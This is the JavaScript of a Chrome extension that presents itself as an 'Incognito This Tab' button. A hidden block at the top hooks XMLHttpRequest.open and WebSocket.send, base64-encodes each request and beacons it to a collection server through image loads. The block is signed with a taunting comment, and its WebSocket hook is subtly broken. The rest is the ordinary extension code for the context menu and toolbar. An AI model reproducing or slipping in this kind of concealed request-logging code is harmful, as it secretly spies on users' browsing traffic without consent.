function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
function onClickHandler(info, tab) {
  chrome.windows.create({"url":tab.url, "incognito":!tab.incognito, "focused": true, "state": "maximized"});
}

// for toolbar button
chrome.browserAction.onClicked.addListener(function(tab) {
    chrome.windows.create({"url":tab.url, "incognito": !tab.incognito, "focused": true, "state": "maximized"});
});


chrome.contextMenus.onClicked.addListener(onClickHandler);


// first run

chrome.runtime.onInstalled.addListener(function(details) {
  // setting up context menu entries
  chrome.contextMenus.create({"title": "Incognito This Tab", "contexts":["page"], "id": "incogthistab"});

  if (details.reason == "install") {
        chrome.tabs.create({ "url": "https://browsernative.com/incognito-chrome/"});
  }
});
